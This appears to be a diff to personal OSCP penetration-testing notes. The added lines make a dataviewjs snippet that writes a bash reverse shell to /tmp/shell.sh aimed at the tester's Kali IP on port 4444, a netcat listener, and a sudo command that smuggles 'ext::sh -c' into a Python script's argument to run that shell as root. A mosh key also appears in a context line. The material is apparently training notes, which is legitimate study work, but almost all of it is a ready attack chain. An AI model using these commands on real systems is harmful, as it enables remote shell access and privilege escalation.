@@ -67,3 +67,22 @@ MOSH_KEY=RmYsRZ1ch9feXBDfpY53jA mosh-client 127.0.0.1 60013
 
 ---
 
+/usr/bin/python3 /opt/internal_apps/clone_changes/clone_prod_change.py
+
+```dataviewjs
+const page = dv.page("Synced OSCP Notes/Top/Active Notes");const KaliIP = page?.["KALI IP"] ?? "NO KALI IP FOUND";
+
+const command = `echo "bash -i >& /dev/tcp/${KaliIP}/4444 0>&1" > /tmp/shell.sh`;
+
+dv.paragraph("```bash\n" + command + "\n```");
+```
+```
+nc -lvnp 4444
+```
+
+```
+sudo /usr/bin/python3 /opt/internal_apps/clone_changes/clone_prod_change.py 'ext::sh -c bash% /tmp/shell.sh'
+```
+
+---
+
